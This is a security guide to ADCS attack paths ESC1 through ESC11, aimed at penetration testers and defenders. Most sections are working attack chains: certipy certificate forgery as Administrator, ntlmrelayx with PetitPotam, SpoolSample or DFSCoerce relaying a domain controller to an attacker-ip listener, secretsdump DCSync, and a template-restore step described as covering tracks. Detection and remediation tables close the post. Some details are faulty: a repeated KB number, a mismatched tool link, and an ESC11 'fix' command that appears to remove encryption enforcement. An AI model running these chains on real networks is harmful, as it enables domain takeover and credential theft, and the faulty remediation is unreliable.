---
title: "ADCS Abuse: ESC1 Through ESC8 Attack Paths"
description: "Comprehensive guide to Active Directory Certificate Services misconfigurations - from ESC1 template abuse to NTLM relay on HTTP enrollment. Covers PKINIT internals, the full ESC1-ESC11 catalogue, exploitation tooling, and audit/remediation strategy."
date: 2026-03-27
difficulty: Hard
tags: [adcs, certificates, pkinit, active-directory]
---

## Overview

AD CS is one of the most overlooked attack surfaces in Active Directory. Misconfigurations in certificate templates and enrollment services can lead to instant domain compromise.

The reason ADCS is so dangerous isn't that the technology is broken - it's that the surface is large, the consequences are severe, and the defaults across decades of Microsoft documentation favoured operational simplicity over security. SpecterOps' 2021 paper *"Certified Pre-Owned"* by Will Schroeder and Lee Christensen catalogued the now-canonical **ESC1 through ESC8** attack classes, with ESC9-ESC11 added by the community since. Most enterprises still have at least one of them open. Once a single template is exploitable, the path from Domain User → Domain Admin is one `certipy` invocation away.

This post walks the catalogue, the exploitation tools, and the remediation strategy.

## Why Certificates Equal Domain Admin

Active Directory supports **PKINIT**, an extension to Kerberos that allows a client to authenticate to the KDC using a certificate instead of a password. The chain:

1. The client requests a certificate from a CA, with a specific "Subject Alternative Name" (SAN) that contains a UPN like `Administrator@corp.local`.
2. If the CA issues the cert (subject only to template enrollment rules), the client now possesses a credential that says "I am Administrator@corp.local".
3. The client uses PKINIT to ask the KDC for a TGT, presenting the certificate.
4. The KDC validates the certificate (issuing CA is trusted, cert is not revoked, SAN identifies a real principal) and returns a TGT for `Administrator`.
5. The TGT is used like any other Kerberos ticket - `dcsync`, lateral movement, anything.

Every ESC* path is a different way to make step 1 succeed for a SAN identifying a privileged user.

## ESC1: Misconfigured Certificate Template

When a template allows the enrollee to specify a Subject Alternative Name (SAN) and low-privilege users can enroll, any user can request a certificate as a Domain Admin.

### The Specific Misconfiguration

A template is ESC1-vulnerable when **all** of the following are true:

| Property | Value |
|---|---|
| `msPKI-Certificate-Name-Flag` includes `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | ✓ |
| `msPKI-Enrollment-Flag` does **not** include `CT_FLAG_PEND_ALL_REQUESTS` (no manager approval) | ✓ |
| Extended Key Usage (EKU) includes `Client Authentication` (1.3.6.1.5.5.7.3.2) or `Smart Card Logon` (1.3.6.1.4.1.311.20.2.2) or `Any Purpose` (2.5.29.37.0) | ✓ |
| `nTSecurityDescriptor` grants `Enroll` to a low-privilege principal (e.g., `Domain Users`, `Authenticated Users`) | ✓ |

That combination is a complete domain compromise primitive - any user can request a cert authenticating as anyone, including a Domain Admin.

### Exploitation with `certipy`

[Certipy](https://github.com/ly4k/Certipy) is the modern de-facto tool (a Python rewrite of Certify with broader features):

```bash
# 1. Find vulnerable templates
certipy find -u alice@corp.local -p 'Pwd!' -dc-ip 10.0.0.1 -vulnerable
# Output highlights ESC1 templates and which groups can enroll

# 2. Request a certificate as Administrator using the vuln template
certipy req \
    -u alice@corp.local -p 'Pwd!' \
    -ca corp-CA-CA -dc-ip 10.0.0.1 \
    -template VulnTemplate \
    -upn administrator@corp.local

# Saves administrator.pfx

# 3. Use the certificate via PKINIT to obtain a TGT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Output: TGT for administrator + NT hash

# 4. Use the hash for DCSync
secretsdump.py -hashes :<NThash> corp.local/administrator@10.0.0.1
```

`certipy auth` performs PKINIT and additionally extracts the user's NT hash via the `UnPACTheHash` technique (the KDC includes the user's NTLM hash in the encrypted PAC of the TGT, and the certificate-bound session key lets you decrypt it).

## ESC2: Templates with "Any Purpose" EKU

Same as ESC1 but the EKU is `Any Purpose` (2.5.29.37.0) or there's no EKU at all. Such certificates are valid for any purpose, including authentication. Even if the template doesn't have ESC1's `ENROLLEE_SUPPLIES_SUBJECT`, the broad EKU can sometimes enable other attacks (e.g., signing a sub-CA).

## ESC3: Enrollment Agent Templates

A template marked as an "Enrollment Agent" lets the holder request certificates *on behalf of* other users. If a low-privilege user can enroll in an Enrollment Agent template, they can then enroll any further template *on behalf of* a Domain Admin.

```bash
# Two-step: get an Enrollment Agent cert, then use it to request DA cert
certipy req -u alice@corp.local -p 'Pwd!' -ca corp-CA-CA -template EnrollmentAgent
certipy req -u alice@corp.local -p 'Pwd!' -ca corp-CA-CA \
    -template User -on-behalf-of 'corp\administrator' \
    -pfx alice.pfx
```

## ESC4: Vulnerable Template ACLs

If a user has write access to a certificate template, they can modify it to become ESC1-vulnerable, enroll, then revert the changes.

### The Attack

```bash
# 1. Identify templates writable by a controllable principal
certipy find -u alice@corp.local -p 'Pwd!' -vulnerable

# Output flags any template where alice (or a group she's in) has GenericWrite/WriteOwner/WriteDacl

# 2. Make the template ESC1-vulnerable
certipy template -u alice@corp.local -p 'Pwd!' -template TargetTemplate -save-old
# Saves backup, applies aggressive permissive defaults

# 3. Issue a certificate as Administrator
certipy req -u alice@corp.local -p 'Pwd!' -ca corp-CA-CA \
    -template TargetTemplate -upn administrator@corp.local

# 4. Restore the original template (covering tracks)
certipy template -u alice@corp.local -p 'Pwd!' \
    -template TargetTemplate -configuration TargetTemplate.json
```

ESC4 is the *most-commonly-exploited* path in real engagements because Domain Admins routinely have `GenericAll` on templates they manage, but those Domain Admins often delegate template management to lesser groups (Help Desk, IT Operations, Cert Admins) - and those groups inherit write access on more templates than their members realise.

## ESC5: Vulnerable PKI Object ACLs

Similar to ESC4 but on other PKI objects: the CA itself, the `NTAuthCertificates` container, the `Public Key Services` container in `CN=Configuration`. Write access there allows an attacker to:

- Add a controlled CA's certificate to `NTAuthCertificates` (effectively trusting their own CA for AD authentication).
- Modify the CA's permissions to let themselves issue arbitrary certificates.

ESC5 finds are rarer but devastating when present.

## ESC6: `EDITF_ATTRIBUTESUBJECTALTNAME2` CA Flag

Some CAs are configured to allow the requester to supply the SAN regardless of template settings, by setting the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag in the CA's `EditFlags` policy. This effectively turns *every* template into ESC1.

```bash
# Detect via certipy
certipy find -u alice@corp.local -p 'Pwd!' -dc-ip 10.0.0.1 -vulnerable
# ESC6 listed under CA properties

# Exploit by requesting any template with -upn override
certipy req -u alice@corp.local -p 'Pwd!' \
    -ca corp-CA-CA -template User \
    -upn administrator@corp.local
```

Microsoft has marked this flag as deprecated and recommends template-level SAN control instead.

## ESC7: Vulnerable CA Access Control

If a low-privilege user has `ManageCA` or `ManageCertificates` rights on the CA itself, they can:

- **`ManageCA`** → grant themselves `ManageCertificates`, then re-issue revoked or denied requests.
- **`ManageCertificates`** → re-issue *any* failed certificate request, effectively bypassing approval.

The chain - request a privileged cert, get denied, then approve your own request - is a `certipy ca` invocation.

## ESC8: NTLM Relay to HTTP Enrollment

Relay coerced NTLM authentication from a domain controller to the AD CS HTTP enrollment endpoint to obtain a DC certificate, then use PKINIT for authentication.

This is the most-published ADCS attack and the catalyst for the AD-relay renaissance of 2021-2022.

### How It Works

1. An AD CS Web Enrollment service (`http://ca-server/certsrv/`) is published. By default it accepts NTLM authentication and **does not enforce HTTPS or Channel Binding**.
2. An attacker on the network coerces NTLM authentication from a target machine - the most powerful target is a Domain Controller, coerced via [PetitPotam](https://github.com/topotam/PetitPotam) (`MS-EFSRPC`), [PrinterBug](https://github.com/leechristensen/SpoolSample) (`MS-RPRN`), or [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce) (`MS-DFSNM`).
3. The attacker relays the inbound NTLM auth to the CA's HTTP enrollment, requesting a certificate for a template that supports DC authentication (e.g., `DomainController`, `KerberosAuthentication`, `Machine`).
4. The CA issues a certificate authenticating the relayed DC.
5. The attacker uses the DC's certificate via PKINIT to obtain a TGT for the DC's machine account, then DCSyncs.

### Tooling Chain

```bash
# Terminal 1 - relay listener
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController

# Terminal 2 - coerce DC to authenticate to your relay
PetitPotam.py -d corp.local -u alice -p 'Pwd!' attacker-ip dc01.corp.local
# or
SpoolSample.exe dc01.corp.local attacker-ip
# or DFSCoerce
dfscoerce.py -u alice -p 'Pwd!' -d corp.local attacker-ip dc01.corp.local

# Relay output: certificate for DC01$ as base64-encoded PFX
# Save to dc01.pfx, then:
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# Output: TGT for DC01$ + NT hash → DCSync → done
```

ESC8 ranks first in real-world impact because the DC is reliably reachable and the coercion primitives almost always work; the limiting factor in 2026 is whether the org has applied patches and Extended Protection for Authentication (EPA).

## ESC9 & ESC10: `userPrincipalName` and `altSecurityIdentities` Mappings

Added by Oliver Lyak and Charlie Clark, these abuse the way the KDC maps certificates to user accounts.

### ESC9 - `CT_FLAG_NO_SECURITY_EXTENSION`

When a template has `CT_FLAG_NO_SECURITY_EXTENSION` set in `msPKI-Enrollment-Flag`, the resulting certificate omits the `szOID_NTDS_CA_SECURITY_EXT` security extension that binds the cert to a specific SID. Combined with the ability to write `userPrincipalName` on a victim user (e.g. via GenericWrite on a low-priv user), the attacker:

1. Sets the victim's UPN to `Administrator` (or any privileged target).
2. Requests a cert as the victim.
3. Resets the victim's UPN to its original value.
4. PKINIT with the cert - the KDC maps by UPN string match → grants TGT for `Administrator`.

### ESC10 - Weak `altSecurityIdentities` Configuration

If `HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement` is set to `0` (disabled, was the default until Microsoft's KB5014754 hardening), and an attacker can write `altSecurityIdentities` on a privileged account, they can map any certificate to that account by writing a `X509:<I>...<S>...` entry.

Microsoft's progressive hardening (KB5014754, KB5014754, KB5039705) is closing these by mandating Strong Certificate Mapping. Audit by checking the registry value on every DC.

## ESC11 - Relay to ICPR (RPC)

Just as ESC8 relays to HTTP enrollment, ESC11 relays to the RPC-based ICertPassage interface (also called ICPR). The relevant tool is [`icpr-relay`](https://github.com/zyn3rgy/LdapRelayScan) and [`certipy relay`](https://github.com/ly4k/Certipy)'s `-target` mode for RPC relay. Useful when HTTP enrollment is disabled but RPC-based enrollment is still exposed.

## Detection

Monitor certificate enrollment events (Event ID 4887), template modifications, and unusual PKINIT authentication patterns.

### Practical Detection Sources

| Signal | Where |
|---|---|
| Cert issued for SAN that doesn't match requester | CA security log, Event 4886/4887 |
| Cert issued via Web Enrollment from a DC's machine account | CA log + IIS log on CA server |
| PKINIT authentication for a privileged account | DC Security log, Event 4768 with PreAuth Type 16 |
| Template ACL change | Directory Service log on DCs, Event 5136 (changes to AD object) |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled | `certutil -getreg policy\EditFlags` on CA |
| MS-EFSRPC / MS-RPRN / MS-DFSNM coercion attempts | Network detection (Suricata signatures), DC RPC audit logs |

### Hunting Queries

[PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) (PowerShell) and [Certipy](https://github.com/ly4k/Certipy) `find` both produce comprehensive reports. As a defender, run them with a privileged account against your own environment quarterly.

## Remediation Catalogue

| ESC | Mitigation |
|---|---|
| ESC1 | Remove `ENROLLEE_SUPPLIES_SUBJECT` from templates that have client authentication EKU and broad enrollment rights |
| ESC2 | Replace "Any Purpose" EKU with specific EKUs |
| ESC3 | Restrict Enrollment Agent templates to specific authorized principals; enable manager approval |
| ESC4 | Audit template DACLs; remove unnecessary write access |
| ESC5 | Audit DACLs on `Public Key Services` container, CA computer object, `NTAuthCertificates` |
| ESC6 | Disable `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 && net stop certsvc && net start certsvc` |
| ESC7 | Audit who has `ManageCA`/`ManageCertificates`; move to least-privilege |
| ESC8 | Enforce HTTPS on Web Enrollment, enable EPA (Extended Protection for Authentication), or disable Web Enrollment if unused |
| ESC9 | Apply KB5014754 (Strong Certificate Mapping); avoid `CT_FLAG_NO_SECURITY_EXTENSION` |
| ESC10 | Set `StrongCertificateBindingEnforcement` to 2 (full enforcement) on all DCs |
| ESC11 | Disable RPC enrollment (`certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST`) or enable signing |

For a clean, auditable baseline:

1. Run `certipy find -vulnerable` against your environment.
2. Triage every flagged template - fix or document.
3. Apply Microsoft's progressive hardening (KB5014754 series).
4. Implement detection on Event 4887 with anomalous SAN patterns.
5. Re-run quarterly. New templates appear; permissions drift.

> ADCS vulnerabilities are everywhere because organizations deploy it once and never audit the templates again. Check yours - every assessment I've performed has found at least one ESC path open, and most have multiple. The good news: the remediation is mechanical once you find them.
